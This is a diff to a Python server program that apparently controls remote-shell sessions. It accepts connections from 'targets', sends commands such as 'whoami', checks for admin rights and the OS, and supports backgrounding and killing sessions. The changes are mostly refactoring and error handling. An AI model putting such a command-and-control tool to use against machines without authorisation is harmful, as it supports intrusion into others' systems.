@@ -53,11 +53,11 @@ class Server:
                 if message == "":
                     pass
                 # background command  
-                if message == "bg":
+                elif message == "bg":
                     print("\n[+] Moving current session to the background.\n")
                     break 
                 # exit command
-                if message == "exit":
+                elif message == "exit":
                     self.send_message(target.id, message)
                     print("\n[-] sending kill signal...")
                     target.id.close()
@@ -118,25 +118,10 @@ class Target:
         self.is_admin = False
         self.os = ""
 
-    def get_username(self, server):
-        server.send_message(self.id, "whoami")
-        user_id = server.recieve_message(self.id).rstrip("\n")
-        if len(user_id.split()) > 5:
-            # print(f"[-] Warning : couldn't resolve user id for {self.ip}.\n")
-            user_id = "[unresolved]"
-        self.user = user_id
-
     def get_time_record(self):
         hour_of_connection = time.strftime("%H:%M:%S", time.localtime())
         date_of_connection = datetime.now()
         self.time_record = (f"{date_of_connection.day}/{date_of_connection.month}/{date_of_connection.year} {hour_of_connection}")
-
-    def get_admin_infos(self, server):
-        admin_message = server.recieve_message(self.id)
-        if (admin_message.split()[0] == "Linux") and (admin_message.split()[1] == "0"):
-            self.is_admin = True
-        elif admin_message == "1":
-            self.is_admin = True
 
     def get_host_and_full_names(self):
         try:
@@ -147,8 +132,31 @@ class Target:
         if self.hostname is not None:
             self.fullname = self.hostname + "@" + self.ip
 
+    def get_admin_infos(self, server):
+        try:
+            server.send_message(self.id, "get_admin_infos")
+            admin_message = server.recieve_message(self.id)
+            if (admin_message.split()[0] == "Linux") and (admin_message.split()[1] == "0"):
+                self.is_admin = True
+            elif admin_message == "1":
+                self.is_admin = True
+        except: 
+            self.is_admin = False
+
     def get_os(self, server):
-        self.os = server.recieve_message(self.id)
+        try:
+            server.send_message(self.id, "get_os_infos")
+            self.os = server.recieve_message(self.id)
+        except:
+            self.os = "[unresolved]"
+    
+    def get_username(self, server):
+        server.send_message(self.id, "whoami")
+        user_id = server.recieve_message(self.id).rstrip("\n")
+        if len(user_id.split()) > 5:
+            # print(f"[-] Warning : couldn't resolve user id for {self.ip}.\n")
+            user_id = "[unresolved]"
+        self.user = user_id
 
     def accept_connection(self, server):
         self.id, ip_and_port = server.current_socket.accept()
@@ -160,5 +168,4 @@ class Target:
         self.get_host_and_full_names()
         self.get_admin_infos(server)
         self.get_os(server)
-        # TODO thread gets stuck here and only closing distant connection will free it
         self.get_username(server)
